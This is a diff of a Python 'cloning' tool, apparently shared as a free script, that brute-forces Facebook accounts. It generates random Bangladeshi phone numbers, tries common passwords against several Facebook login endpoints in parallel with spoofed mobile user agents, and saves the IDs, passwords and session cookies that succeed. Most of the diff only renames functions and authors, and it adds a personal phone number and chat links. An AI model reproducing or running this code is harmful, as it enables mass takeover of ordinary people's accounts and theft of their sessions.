@@ -1,7 +1,7 @@
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-#Sc Make By XYN Islam XYN
-#XYN By Jahid & XYN
-#Github KgXYN
+#Sc Make By Asraful Islam Hasan
+#Gift By Jahid & Hasan
+#Github KgHasan
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
 #••••••••••••••••••••••••IMPORT MODULE•••••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
@@ -56,7 +56,7 @@ loop = 0
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
 #•••••••••••••••••••••••••••USER AGENT•••••••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-def XYN001():
+def hasan001():
 	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
 	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
 	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
@@ -64,7 +64,7 @@ def XYN001():
 	eb = ";[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027763;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+en+";FBRV/209644275;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+kt+";FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
 	ua = su + eb	
 	return ua
-def XYN002():
+def hasan002():
 	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
 	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
 	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
@@ -77,7 +77,7 @@ def XYN002():
 	kk = "Dalvik/1.6.0 (Linux; U; Android 7.0; 640 Build/1136) [FBAN/FB4A;FBAV/108.0.0.17.68;FBBV/108;FBDM/{density=3.0,width=640,height=1136};FBLC/it_IT;FBRV/108.0.0.17.68;FBCR/Etisalat Afghanistan;FBMF/Huawei_P40_Pro;FBBD/Huawei_P40_Pro;FBPN/com.facebook.katana;FBDV/Huawei_P40_Pro_7_0;FBSV/7.0;FBOP/1;FBCA/x86:armeabi-v7a;]"	
 	ua = sd + el + by + ff + gp + hc + kk	
 	return ua
-def XYN003():
+def hasan003():
 	ua = ("")
 	return ua
 ugen=[]
@@ -315,14 +315,13 @@ for xd in range(10000):
 #••••••••••••••••••••••••••••MY LOGO••••••••••••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
 logo =("""
-Y88b   d88P Y88b   d88P 888b    888 
- Y88b d88P   Y88b d88P  8888b   888 
-  Y88o88P     Y88o88P   88888b  888 
-   Y888P       Y888P    888Y88b 888 
-   d888b        888     888 Y88b888 
-  d88888b       888     888  Y88888 
- d88P Y88b      888     888   Y8888 
-d88P   Y88b     888     888    Y888 
+ ╔═════════════════════╗╔════════════════════════════╗   
+ ║  ▄▄ • ▪  ·▄▄▄▄▄▄▄▄  ║║ Developar : Asraful Islam  ║
+ ║ ▐█ ▀ ▪██ ▐▄▄·•██    ║║ Admin     : Jahid & Hasan  ║
+ ║ ▄█ ▀█▄▐█·██▪  ▐█.▪  <> Github    : KgHasan        ║
+ ║ ▐█▄▪▐█▐█▌██▌. ▐█▌·  ║║ Stetus    : Free Sc Gift   ║
+ ║ ·▀▀▀▀ ▀▀▀▀▀▀  ▀▀▀   ║║ Code      : 02             ║
+ ╚═════════════════════╝╚════════════════════════════╝""") 
 cloninglogo =("""
 \033[1;97m ╔══════════════════════════════════════╗   
  \033[1;97m║ \033[1;95m╔═╗╔╦╗╔═╗╦═╗╔╦╗  ╔═╗╦  ╔═╗╔╗╔╦╔╗╔╔═╗\033[1;97m ║
@@ -352,9 +351,9 @@ def Al_Hasan():
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
 #••••••••••••••••••••••••SCRIPT MAIN•••••••••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-def Nodi_XYN():
+def Nodi_Hasan():
 	#os.system('xdg-open https://www.facebook.com/copy.link.erorr404')
-    os.system('clear');print(logo);print("  \033[1;35m[\033[1;32m1\033[1;35m]\033[1;32m BD RANDOM \033[1;35m[\033[1;32m2\033[1;35m]\033[1;32m MY CONTACT INFO \033[1;35m[\033[1;32m0\033[1;35m]\033[1;32m CLOSED TOOLS");Al_XYN();Tahrima = input(f'  \033[1;91m[\033[1;97m?\033[1;91m]\033[1;32m CHOICE YOUR OPTION :\033[1;36m ')
+    os.system('clear');print(logo);print("  \033[1;35m[\033[1;32m1\033[1;35m]\033[1;32m BD RANDOM \033[1;35m[\033[1;32m2\033[1;35m]\033[1;32m MY CONTACT INFO \033[1;35m[\033[1;32m0\033[1;35m]\033[1;32m CLOSED TOOLS");Al_Hasan();Tahrima = input(f'  \033[1;91m[\033[1;97m?\033[1;91m]\033[1;32m CHOICE YOUR OPTION :\033[1;36m ')
     if Tahrima in ["1","A","a"]:
         Nodi()
     if Tahrima in ["2","B","b"]:
@@ -362,7 +361,7 @@ def Nodi_XYN():
     if Tahrima in ["0","E","e"]:
         exit('  \033[1;35m[\033[1;32m✓\033[1;35m]\033[1;32m THANKS USE MY TOOLS')
     else:
-    	print("  \033[1;35m[\033[1;32m×\033[1;35m]\033[1;32m Worning Typ");Nodi_XYN()
+    	print("  \033[1;35m[\033[1;32m×\033[1;35m]\033[1;32m Worning Typ");Nodi_Hasan()
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
 #••••••••••••••••••••••CONTACT INFO•••••••••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
@@ -383,25 +382,25 @@ def Contact():
 	if Tymin in ['1']:
 		os.system('xdg-open https://www.facebook.com/copy.link.erorr404')
 	if Tymin in ['2']:
-		os.system('xdg-open https://www.facebook.com/profile.php?id=//')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100090740779812')
 	if Tymin in ['3']:
-		os.system('xdg-open https://facebook.com/groups/-/')
+		os.system('xdg-open https://facebook.com/groups/551365756758487/')
 	if Tymin in ['4']:
-		os.system('xdg-open https://facebook.com/groups/-/')
+		os.system('xdg-open https://facebook.com/groups/920428789151086/')
 	if Tymin in ['5']:
-		os.system('xdg-open https://chat.whatsapp.com/-')
+		os.system('xdg-open https://chat.whatsapp.com/I7PeGFx4eSd5plAv7iXDrV')
 	if Tymin in ['6']:
-		os.system('xdg-open wa.me/+')
+		os.system('xdg-open wa.me/+8801996636652')
 	if Tymin in ['7']:
-		os.system('xdg-open t.me/-')
+		os.system('xdg-open t.me/fuck_bby344')
 	if Tymin in ['8']:
-		os.system('xdg-open https://github.com/Fx990')
+		os.system('xdg-open https://github.com/KgHasan')
 	if Tymin in ['9']:
-		Nodi_XYN()
+		Nodi_Hasan()
 	if Tymin in ['0']:
 		exit('  \033[1;35m[\033[1;32m1 ✓\033[1;35m]\033[1;32m THANKS USE MY TOOLS')
 	else:
-		print("  \033[1;35m[\033[1;32m×\033[1;35m]\033[1;32m Warning Typ"); Contact()
+		print("  \033[1;35m[\033[1;32m×\033[1;35m]\033[1;32m Worning Typ"); Contact()
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
 #••••••••••••••••••••••••••BD CLONE••••••••••••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
@@ -409,17 +408,17 @@ def Nodi():
     user=[]
     os.getuid
     os.geteuid
-    Al_XYN()
+    Al_Hasan()
     print("  \033[1;35m[\033[1;32m~\033[1;35m]\033[1;32m CHOICE YOU CODE - \033[1;90m[\033[1;95m017\033[1;90m]•\033[1;90m[\033[1;95m019\033[1;90m]•\033[1;90m[\033[1;95m014\033[1;90m]•\033[1;90m[\033[1;95m016\033[1;90m]•\033[1;90m[\033[1;95m018\033[1;90m]")
     code = input('  \033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m SIM CODE :\033[1;36m ')
-    Al_XYN()
+    Al_Hasan()
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-#••••••••••••••••••••••CHOICE METHOD•••••••••••••••••••••••#
+#••••••••••••••••••••••CHOICE MATHOID•••••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-    print("  \033[1;35m[\033[1;32m1\033[1;35m]\033[1;32m METHOD\033[1;90m<>\033[1;35m[\033[1;32m2\033[1;35m]\033[1;32m METHOD\033[1;90m<>\033[1;35m[\033[1;32m3\033[1;35m]\033[1;32m METHOD\033[1;90m<>\033[1;35m[\033[1;32m4\033[1;35m]\033[1;32m METHOD")
-    print("  \033[1;35m[\033[1;32m5\033[1;35m]\033[1;32m METHOD\033[1;90m<>\033[1;35m[\033[1;32m6\033[1;35m]\033[1;32m MAIN MENU\033[1;90m<>\033[1;35m[\033[1;32m0\033[1;35m]\033[1;32m EXIT")
-    Al_XYN()
-    math = input("  \033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m CHOICE METHOD : ")
+    print("  \033[1;35m[\033[1;32m1\033[1;35m]\033[1;32m MATHOID\033[1;90m<>\033[1;35m[\033[1;32m2\033[1;35m]\033[1;32m MATHOID\033[1;90m<>\033[1;35m[\033[1;32m3\033[1;35m]\033[1;32m MATHOID\033[1;90m<>\033[1;35m[\033[1;32m4\033[1;35m]\033[1;32m MATHOID")
+    print("  \033[1;35m[\033[1;32m5\033[1;35m]\033[1;32m MATHOID\033[1;90m<>\033[1;35m[\033[1;32m6\033[1;35m]\033[1;32m MAIN MENU\033[1;90m<>\033[1;35m[\033[1;32m0\033[1;35m]\033[1;32m EXIT")
+    Al_Hasan()
+    math = input("  \033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m CHOICE MATHOID : ")
     nabil=[]
     if math in ["1"]:
     	nabil.append('M1')
@@ -432,22 +431,22 @@ def Nodi():
     if math in ['5']:
     	nabil.append('M5')
     if math in ['6']:
-    	Nodi_XYN()
+    	Nodi_Hasan()
     if math in ['0']:
     	exit("  \033[1;35m[\033[1;32m✓\033[1;35m]\033[1;32m THANKS USE MY TOOLS")
-    Al_XYN()
+    Al_Hasan()
     print("  \033[1;35m[\033[1;32m~\033[1;35m]\033[1;32m CHOICE YOUR LIMIT : \033[1;90m[\033[1;95m1000\033[1;90m]•\033[1;90m[\033[1;95m2000\033[1;90m]•\033[1;90m[\033[1;95m5000\033[1;90m]•\033[1;90m[\033[1;95m10000\033[1;90m]")
     limit=int(input("  \033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m LIMIT :\033[1;36m "))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=40) as XYN_Asha:
+    with ThreadPool(max_workers=40) as Hasan_Asha:
         os.system('clear')
         print(cloninglogo)
         Contact_Linex()
         tl = str(len(user))
         faking = nabil[0]
-        print("  \033[1;35m[\033[1;32m✓\033[1;35m]\033[1;32m CHOICE METHOD : \033[1;94m"+faking)
+        print("  \033[1;35m[\033[1;32m✓\033[1;35m]\033[1;32m CHOICE MATHOID : \033[1;94m"+faking)
         print(f'  \033[1;35m[\033[1;32m✓\033[1;35m]\033[1;32m SIM CODE       : \033[1;94m'+code) 
         print(f'  \033[1;35m[\033[1;32m✓\033[1;35m]\033[1;32m TOTAL ACCOUNT  : \033[1;94m'+tl)
         Contact_Linex()
@@ -455,21 +454,21 @@ def Nodi():
             pwx = [love,love[2:],code+love[:3],'123456','FreeFire','Pubg123','TikTok','Bangladesh','sadiya','mahbuba','mahbub','ayesha','sumaiya','tamanna','kadija','sultana','sanjida']
             uid = code+love
             if 'M1' in nabil:
-            	XYN_Asha.submit(XYN1,uid,pwx,tl)
+            	Hasan_Asha.submit(Asraful1,uid,pwx,tl)
             elif 'M2' in nabil:
-            	XYN_Asha.submit(XYN2,uid,pwx,tl)
+            	Hasan_Asha.submit(Asraful2,uid,pwx,tl)
             elif 'M3' in nabil:
-            	XYN_Asha.submit(XYN3,uid,pwx,tl)
+            	Hasan_Asha.submit(Asraful3,uid,pwx,tl)
             elif 'M4' in nabil:
-            	XYN_Asha.submit(XYN4,uid,pwx,tl)
+            	Hasan_Asha.submit(Asraful4,uid,pwx,tl)
             elif 'M5' in nabil:
-            	XYN_Asha.submit(XYN5,uid,pwx,tl)
+            	Hasan_Asha.submit(Asraful5,uid,pwx,tl)
             else:
-            	XYN_Asha.submit(XYN1,uid,pwx,tl)
+            	Hasan_Asha.submit(Asraful1,uid,pwx,tl)
 #•••••••••••••••••••••••••M-UPDATE M1••••••••••••••••••••••••••#
-#••••••••••••••••••••SCRIPT METHOD M1•••••••••••••••••••••#
+#••••••••••••••••••••SCRIPT MATHOID M1•••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-def XYN1(uid,pwx,tl):
+def Asraful1(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -477,9 +476,9 @@ def XYN1(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXYN-M1\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mGIFT-M1\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
             sys.stdout.flush()
-            ashaXYN = random.choice(bangla)
+            ashahasan = random.choice(bangla)
             free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -515,13 +514,13 @@ def XYN1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f'  \033[1;96m[\033[1;92mXYN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/XYN-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f'  \033[1;96m[\033[1;92mHASAN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/HASAN-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('  \033[1;90m[XYN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/XYN-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
+                print('  \033[1;90m[HASAN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/HASAN-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
@@ -530,9 +529,9 @@ def XYN1(uid,pwx,tl):
     except:
         pass
 #•••••••••••••••••••••••••P-UPDATE M2••••••••••••••••••••••••••#
-#••••••••••••••••••••SCRIPT METHOD M2••••••••••••••••••••#
+#••••••••••••••••••••SCRIPT MATHOID M2••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-def XYN2(uid,pwx,tl):
+def Asraful2(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -540,9 +539,9 @@ def XYN2(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXYN-M2\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mGIFT-M2\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
             sys.stdout.flush()
-            XYNasha = random.choice(ugen)
+            hasanasha = random.choice(ugen)
             free_fb = session.get('https://p.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -574,20 +573,20 @@ def XYN2(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': XYNasha,
+            'user-agent': hasanasha,
             'viewport-width': '980',}
             lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f'  \033[1;96m[\033[1;92mXYN-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/XYN-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f'  \033[1;96m[\033[1;92mHASAN-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/HASAN-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('  \033[1;90m[XYN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/XYN-CP-M2.txt', 'a').write( uid+' | '+ps+' \n')
+                #print('  \033[1;90m[HASAN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/HASAN-CP-M2.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
@@ -596,9 +595,9 @@ def XYN2(uid,pwx,tl):
     except:
         pass
 #•••••••••••••••••••••••••X-UPDATE M3••••••••••••••••••••••••••#
-#••••••••••••••••••••SCRIPT METHOD M3•••••••••••••••••••••#
+#••••••••••••••••••••SCRIPT MATHOID M3•••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-def XYN3(uid,pwx,tl):
+def Asraful3(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -606,9 +605,9 @@ def XYN3(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXYN-M3\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mGIFT-M3\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
             sys.stdout.flush()
-            XYNasha = random.choice(ugen)
+            hasanasha = random.choice(ugen)
             free_fb = session.get('https://x.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -640,20 +639,20 @@ def XYN3(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': XYNasha,
+            'user-agent': hasanasha,
             'viewport-width': '980',}
             lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f'  \033[1;96m[\033[1;92mXYN-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/XYN-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f'  \033[1;96m[\033[1;92mHASAN-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/HASAN-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('  \033[1;90m[XYN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/XYN-CP-M3.txt', 'a').write( uid+' | '+ps+' \n')
+                #print('  \033[1;90m[HASAN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/HASAN-CP-M3.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
@@ -662,9 +661,9 @@ def XYN3(uid,pwx,tl):
     except:
         pass
 #•••••••••••••••••••••••••P-UPDATE M4••••••••••••••••••••••••••#
-#••••••••••••••••••••SCRIPT METHOD M4•••••••••••••••••••••#
+#••••••••••••••••••••SCRIPT MATHOID M4•••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-def XYN4(uid,pwx,tl):
+def Asraful4(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -672,9 +671,9 @@ def XYN4(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXYN-M4\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mGIFT-M4\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
             sys.stdout.flush()
-            XYNasha = random.choice(ugen)
+            hasanasha = random.choice(ugen)
             free_fb = session.get('https://p.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -706,20 +705,20 @@ def XYN4(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': XYNasha,
+            'user-agent': hasanasha,
             'viewport-width': '980',}
             lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f'  \033[1;96m[\033[1;92mXYN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/XYN-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f'  \033[1;96m[\033[1;92mHASAN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/HASAN-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('  \033[1;90m[XYN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/XYN-CP-M4.txt', 'a').write( uid+' | '+ps+' \n')
+                #print('  \033[1;90m[HASAN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/HASAN-CP-M4.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
@@ -728,9 +727,9 @@ def XYN4(uid,pwx,tl):
     except:
         pass
 #••••••••••••••••••••MBASIC-UPDATE M5••••••••••••••••••••••#
-#••••••••••••••••••••SCRIPT METHOD M5•••••••••••••••••••••#
+#••••••••••••••••••••SCRIPT MATHOID M5•••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
-def XYN5(uid,pwx,tl):
+def Asraful5(uid,pwx,tl):
     global loop
     global cps
     global oks
@@ -738,9 +737,9 @@ def XYN5(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mXYN-M5\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mGIFT-M5\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
             sys.stdout.flush()
-            ashaXYN = random.choice(bangla)
+            ashahasan = random.choice(bangla)
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -771,20 +770,20 @@ def XYN5(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': ashaXYN,
+            'user-agent': ashahasan,
             'viewport-width': '980',}
             lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f'  \033[1;96m[\033[1;92mXYN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/XYN-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
+                print(f'  \033[1;96m[\033[1;92mHASAN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/HASAN-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('  \033[1;90m[XYN-ᏟᏢ] '+uid+' | '+ps+' \n')open('/sdcard/XYN-CP-M5.txt', 'a').write( uid+' | '+ps+' \n')
+                #print('  \033[1;90m[HASAN-ᏟᏢ] '+uid+' | '+ps+' \n')open('/sdcard/HASAN-CP-M5.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
@@ -792,7 +791,7 @@ def XYN5(uid,pwx,tl):
         loop+=1
     except:
         pass
-Nodi_XYN()
+Nodi_Hasan()
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
 #•••••••••••••••••••••••••••CLOSED•••••••••••••••••••••••••••••••••#
 #•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
